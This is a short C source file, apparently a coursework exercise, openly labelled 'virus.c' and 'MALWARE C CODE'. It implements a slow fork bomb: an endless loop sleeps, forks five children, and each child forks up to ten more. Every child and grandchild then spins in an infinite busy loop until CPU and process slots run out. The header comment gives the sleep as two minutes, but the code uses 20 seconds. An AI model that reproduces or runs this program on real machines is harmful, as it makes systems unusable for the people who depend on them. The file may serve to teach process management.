/*
 * virus.c
 * MALWARE C CODE
 * Implement a process P that sleeps for 2 minutes, then wakes up and spawns
 * 5 processes and again goes to sleep. Each of these 5 spawned processes
 * will again spawn 10 processes each, and then run an infinite loop.
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>

#define CHILD_PROCESSES 5
#define GRANDCHILDREN_PROCESSES 10
#define SLEEP_DURATION 20

int main()
{
    pid_t pid;
    while(1){
    sleep(SLEEP_DURATION);
    for (int i = 0; i < CHILD_PROCESSES; i++)
    {
        pid = fork();
        if (pid == 0)
        {
            int j;
            for (j = 0; j < GRANDCHILDREN_PROCESSES; j++)
            {
                if (fork() == 0)
                {
                    break;
                }
            }
            while(1){}
            exit(0);
        }
    }
    }
    return 0;
}
